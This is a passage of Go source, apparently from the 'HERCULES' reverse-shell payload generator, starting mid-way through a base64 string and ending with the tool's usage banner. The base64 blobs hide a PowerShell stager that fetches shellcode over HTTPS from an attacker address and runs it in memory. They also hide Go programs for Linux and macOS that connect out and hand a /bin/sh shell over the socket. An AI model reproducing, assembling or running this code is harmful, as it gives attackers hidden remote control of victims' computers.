HdpbmRvd3Nwb3dlcnNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGUgLU5vUCAtTm9uSSAtVyBIaWRkZW4gLUV4ZWMgQnlwYXNzIC1Db21tYW5kICJJbnZva2UtRXhwcmVzc2lvbiAkKE5ldy1PYmplY3QgSU8uU3RyZWFtUmVhZGVyICgkKE5ldy1PYmplY3QgSU8uQ29tcHJlc3Npb24uRGVmbGF0ZVN0cmVhbSAoJChOZXctT2JqZWN0IElPLk1lbW9yeVN0cmVhbSAoLCQoW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKFwiYCtFbmNvZGVkQ29tcHJlc3NlZEJ1ZmZlcitgXCIpKSkpLCBbSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2RlXTo6RGVjb21wcmVzcykpLCBbVGV4dC5FbmNvZGluZ106OkFTQ0lJKSkuUmVhZFRvRW5kKCk7IikKCmAKCiAgcmV0dXJuIFNoZWxsX1RlbXBsYXRlOwoKfQoKCmZ1bmMgUkVWRVJTRV9IVFRQU19TSEVMTChJUF9QT1JUIHN0cmluZykgKHN0cmluZykgey8vbCwgXyA6PSBiYXNlNjQuU3RkRW5jb2RpbmcuRGVjb2RlKGJhc2U2NFRleHQsIFtdYnl0ZShtZXNzYWdlKSkKICAKCgpQb3dlcnNoZWxsX1JldmVyc2VfSHR0cHMsIF8gOj0gYmFzZTY0LlN0ZEVuY29kaW5nLkRlY29kZVN0cmluZyhgSkhFZ1BTQkFJZzBLVzBSc2JFbHRjRzl5ZENnaWEyVnlibVZzTXpJdVpHeHNJaWxkSUhCMVlteHBZeUJ6ZEdGMGFXTWdaWGgwWlhKdQpJRWx1ZEZCMGNpQldhWEowZFdGc1FXeHNiMk1vU1c1MFVIUnlJR3h3UVdSa2NtVnpjeXdnZFdsdWRDQmtkMU5wZW1Vc0lIVnBiblFnClpteEJiR3h2WTJGMGFXOXVWSGx3WlN3Z2RXbHVkQ0JtYkZCeWIzUmxZM1FwT3cwS1cwUnNiRWx0Y0c5eWRDZ2lhMlZ5Ym1Wc016SXUKWkd4c0lpbGRJSEIxWW14cFl5QnpkR0YwYVdNZ1pYaDBaWEp1SUVsdWRGQjBjaUJEY21WaGRHVlVhSEpsWVdRb1NXNTBVSFJ5SUd4dwpWR2h5WldGa1FYUjBjbWxpZFhSbGN5d2dkV2x1ZENCa2QxTjBZV05yVTJsNlpTd2dTVzUwVUhSeUlHeHdVM1JoY25SQlpHUnlaWE56CkxDQkpiblJRZEhJZ2JIQlFZWEpoYldWMFpYSXNJSFZwYm5RZ1pIZERjbVZoZEdsdmJrWnNZV2R6TENCSmJuUlFkSElnYkhCVWFISmwKWVdSSlpDazdEUW9pUUEwS2RISjVleVJrSUQwZ0lrRkNRMFJGUmtkSVNVcExURTFPVDFCUlVsTlVWVlpYV0ZsYVlXSmpaR1ZtWjJocAphbXRzYlc1dmNIRnljM1IxZG5kNGVYb3dNVEl6TkRVMk56ZzVJaTVVYjBOb1lYSkJjbkpoZVNncERRcG1kVzVqZEdsdmJpQmpLQ1IyCktYc2djbVYwZFhKdUlDZ29XMmx1ZEZ0ZFhTQWtkaTVVYjBOb1lYSkJjbkpoZVNncElId2dUV1ZoYzNWeVpTMVBZbXBsWTNRZ0xWTjEKYlNrdVUzVnRJQ1VnTUhneE1EQWdMV1Z4SURreUtYME5DbVoxYm1OMGFXOXVJSFFnZXlSbUlEMGdJaUk3TVM0dU0zeG1iM0psWVdObwpMVzlpYW1WamRIc2taaXM5SUNSa1d5aG5aWFF0Y21GdVpHOXRJQzF0WVhocGJYVnRJQ1JrTGt4bGJtZDBhQ2xkZlR0eVpYUjFjbTRnCkpHWTdmUTBLWm5WdVkzUnBiMjRnWlNCN0lIQnliMk5sYzNNZ2UxdGhjbkpoZVYwa2VDQTlJQ1I0SUNzZ0pGOTlPeUJsYm1RZ2V5UjQKSUh3Z2MyOXlkQzF2WW1wbFkzUWdleWh1WlhjdGIySnFaV04wSUZKaGJtUnZiU2t1Ym1WNGRDZ3BmWDE5RFFwbWRXNWpkR2x2YmlCbgpleUJtYjNJZ0tDUnBQVEE3SkdrZ0xXeDBJRFkwT3lScEt5c3BleVJvSUQwZ2REc2theUE5SUNSa0lId2daVHNnSUdadmNtVmhZMmdnCktDUnNJR2x1SUNScktYc2tjeUE5SUNSb0lDc2dKR3c3SUdsbUlDaGpLQ1J6S1NrZ2V5QnlaWFIxY200Z0pITWdmWDE5Y21WMGRYSnUKSUNJNWRsaFZJanQ5RFFwYlRtVjBMbE5sY25acFkyVlFiMmx1ZEUxaGJtRm5aWEpkT2pwVFpYSjJaWEpEWlhKMGFXWnBZMkYwWlZaaApiR2xrWVhScGIyNURZV3hzWW1GamF5QTlJSHNrZEhKMVpYMDdKRzBnUFNCT1pYY3RUMkpxWldOMElGTjVjM1JsYlM1T1pYUXVWMlZpClEyeHBaVzUwT3cwS0pHMHVTR1ZoWkdWeWN5NUJaR1FvSW5WelpYSXRZV2RsYm5RaUxDQWlUVzk2YVd4c1lTODBMakFnS0dOdmJYQmgKZEdsaWJHVTdJRTFUU1VVZ05pNHhPeUJYYVc1a2IzZHpJRTVVS1NJcE95UnVJRDBnWnpzZ1cwSjVkR1ZiWFYwZ0pIQWdQU0FrYlM1RQpiM2R1Ykc5aFpFUmhkR0VvSW1oMGRIQnpPaTh2WUN0emRISnBibWNvU1ZCZlVFOVNWQ2tyWUM4a2JpSWdLUTBLSkc4Z1BTQkJaR1F0ClZIbHdaU0F0YldWdFltVnlSR1ZtYVc1cGRHbHZiaUFrY1NBdFRtRnRaU0FpVjJsdU16SWlJQzF1WVcxbGMzQmhZMlVnVjJsdU16SkcKZFc1amRHbHZibk1nTFhCaGMzTjBhSEoxRFFva2VEMGtiem82Vm1seWRIVmhiRUZzYkc5aktEQXNKSEF1VEdWdVozUm9MREI0TXpBdwpNQ3d3ZURRd0tUdGJVM2x6ZEdWdExsSjFiblJwYldVdVNXNTBaWEp2Y0ZObGNuWnBZMlZ6TGsxaGNuTm9ZV3hkT2pwRGIzQjVLQ1J3CkxDQXdMQ0JiU1c1MFVIUnlYU2drZUM1VWIwbHVkRE15S0NrcExDQWtjQzVNWlc1bmRHZ3BEUW9rYnpvNlEzSmxZWFJsVkdoeVpXRmsKS0RBc01Dd2tlQ3d3TERBc01Da2dmQ0J2ZFhRdGJuVnNiRHNnVTNSaGNuUXRVMnhsWlhBZ0xWTmxZMjl1WkNBNE5qUXdNSDFqWVhSagphSHQ5YCkKCiAgSW5kZXggOj0gc3RyaW5ncy5SZXBsYWNlKHN0cmluZyhQb3dlcnNoZWxsX1JldmVyc2VfSHR0cHMpLCAiK3N0cmluZyhJUF9QT1JUKSsiLCBJUF9QT1JULCAtMSkKCgogIHJldHVybiBzdHJpbmcoSW5kZXgpCgp9Cg==`
var LINUX_PAYLOAD string = `CnBhY2thZ2UgbWFpbgoKCiAKaW1wb3J0Im9zL2V4ZWMiCmltcG9ydCJuZXQiCmltcG9ydCAidGltZSIKaW1wb3J0ICJwYXRoL2ZpbGVwYXRoIgppbXBvcnQgIm9zIgoKY29uc3QgVklDVElNX0lQIHN0cmluZyA9ICIxMjcuMC4wLjEiOwpjb25zdCBWSUNUSU1fUE9SVCBzdHJpbmcgPSAiODU1MiI7CgpmdW5jIG1haW4oKXsKICAgIGNvbm5lY3QsIGVyciA6PW5ldC5EaWFsKCJ0Y3AiLFZJQ1RJTV9JUCsiOiIrVklDVElNX1BPUlQpOwogICAgaWYgZXJyICE9IG5pbCB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICB0aW1lLlNsZWVwKDE1KnRpbWUuU2Vjb25kKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgIG1haW4oKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIH07IAogICAgZGlyLCBfIDo9IGZpbGVwYXRoLkFicyhmaWxlcGF0aC5EaXIob3MuQXJnc1swXSkpOyAgICAgCiAgICB2ZXJzaW9uX2NoZWNrIDo9IGV4ZWMuQ29tbWFuZCgic2giLCAiLWMiLCAidW5hbWUgLWEiKTsKICAgIHZlcnNpb24sIF8gOj0gdmVyc2lvbl9jaGVjay5PdXRwdXQoKTsgICAgICAgICAgIAogICAgU3lzR3VpZGUgOj0gKHN0cmluZyh2ZXJzaW9uKSk7ICAgCiAgICBjb25uZWN0LldyaXRlKFtdYnl0ZShzdHJpbmcoU3lzR3VpZGUpKSkKICAgIGNtZDo9ZXhlYy5Db21tYW5kKCIvYmluL3NoIik7CiAgICBjbWQuU3RkaW49Y29ubmVjdDsKICAgIGNtZC5TdGRvdXQ9Y29ubmVjdDsKICAgIGNtZC5TdGRlcnI9Y29ubmVjdDsKICAgIGNtZC5SdW4oKTsKfQ==`
var OSX_PAYLOAD string = `CnBhY2thZ2UgbWFpbgoKCiAKaW1wb3J0Im9zL2V4ZWMiCmltcG9ydCJuZXQiCmltcG9ydCAidGltZSIKaW1wb3J0ICJwYXRoL2ZpbGVwYXRoIgppbXBvcnQgIm9zIgoKY29uc3QgVklDVElNX0lQIHN0cmluZyA9ICIxMjcuMC4wLjEiOwpjb25zdCBWSUNUSU1fUE9SVCBzdHJpbmcgPSAiODU1MiI7CgpmdW5jIG1haW4oKXsKICAgIGNvbm5lY3QsIGVyciA6PW5ldC5EaWFsKCJ0Y3AiLFZJQ1RJTV9JUCsiOiIrVklDVElNX1BPUlQpOwogICAgaWYgZXJyICE9IG5pbCB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICB0aW1lLlNsZWVwKDE1KnRpbWUuU2Vjb25kKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgIG1haW4oKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIH07IAogICAgZGlyLCBfIDo9IGZpbGVwYXRoLkFicyhmaWxlcGF0aC5EaXIob3MuQXJnc1swXSkpOyAgICAgCiAgICB2ZXJzaW9uX2NoZWNrIDo9IGV4ZWMuQ29tbWFuZCgic2giLCAiLWMiLCAidW5hbWUgLWEiKTsKICAgIHZlcnNpb24sIF8gOj0gdmVyc2lvbl9jaGVjay5PdXRwdXQoKTsgICAgICAgICAgIAogICAgU3lzR3VpZGUgOj0gKHN0cmluZyh2ZXJzaW9uKSk7ICAgCiAgICBjb25uZWN0LldyaXRlKFtdYnl0ZShzdHJpbmcoU3lzR3VpZGUpKSkKICAgIGNtZDo9ZXhlYy5Db21tYW5kKCIvYmluL3NoIik7CiAgICBjbWQuU3RkaW49Y29ubmVjdDsKICAgIGNtZC5TdGRvdXQ9Y29ubmVjdDsKICAgIGNtZC5TdGRlcnI9Y29ubmVjdDsKICAgIGNtZC5SdW4oKTsKfQ==`




var HELP string = `

                  __  ____________  ________  ____    ___________
                 / / / / ____/ __ \/ ____/ / / / /   / ____/ ___/
                / /_/ / __/ / /_/ / /   / / / / /   / __/  \__ \ 
               / __  / /___/ _, _/ /___/ /_/ / /___/ /___ ___/ / 
              /_/ /_/_____/_/ |_|\____/\____/_____/_____//____/  
                                                   

############################ HERCULES REVERSE SHELL ############################



Usage : ./HERCULES <Local Ip> <Local Port> <options>


Options : 

      -p                 Payload to use. ( Windows / Linux / OSX )

      -a                 The architecture to use. ( x86, x64 )
      
      -l                 Specify linking type for compiler. ( static, dynamic )


`

